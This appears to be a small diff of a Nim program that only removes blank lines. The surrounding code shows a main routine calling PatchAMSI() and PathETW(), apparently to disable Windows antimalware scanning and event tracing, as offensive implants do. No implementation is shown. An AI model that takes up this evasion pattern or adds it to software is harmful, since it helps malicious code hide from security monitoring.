@@ -1,8 +1,6 @@
 import os, json, strformat
 import utils, comms, config
-
 proc main() =
-    
     discard PatchAMSI()
     echo "ASMI done!"
     discard PathETW()
